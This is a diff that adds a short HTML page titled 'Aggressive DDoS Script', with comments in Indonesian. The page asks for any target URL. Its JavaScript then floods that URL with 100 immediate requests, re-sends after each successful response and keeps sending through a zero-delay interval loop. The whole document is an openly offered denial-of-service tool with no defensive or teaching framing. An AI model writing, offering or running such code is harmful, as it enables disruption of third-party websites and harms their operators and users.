@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Aggressive DDoS Script</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin-top: 50px;
+        }
+        #status {
+            margin-top: 20px;
+            font-size: 1.2em;
+            color: red;
+        }
+    </style>
+</head>
+<body>
+    <h1>Aggressive DDoS Attack</h1>
+    <p>Target URL: <input type="text" id="targetURL" placeholder="https://example.com" style="width: 300px; padding: 5px; font-size: 1em;"></p>
+    <button onclick="startAttack()">Start Attack</button>
+    <div id="status"></div>
+
+    <script>
+        function startAttack() {
+            const targetURL = document.getElementById('targetURL').value;
+            if (!targetURL) {
+                document.getElementById('status').innerText = 'Please enter a valid target URL.';
+                return;
+            }
+
+            document.getElementById('status').innerText = 'Attack in progress...';
+
+            function sendRequest() {
+                const xhr = new XMLHttpRequest();
+                xhr.open('GET', targetURL, true);
+                xhr.send();
+                xhr.onload = function() {
+                    if (xhr.status === 200) {
+                        sendRequest();
+                    }
+                };
+            }
+
+            for (let i = 0; i < 100; i++) { // HelicopterAttack: membuat 100 permintaan segera
+                sendRequest();
+            }
+
+            setInterval(sendRequest, 0); // Aggressive loop: mengirimkan permintaan terus-menerus
+        }
+    </script>
+</body>
+</html>
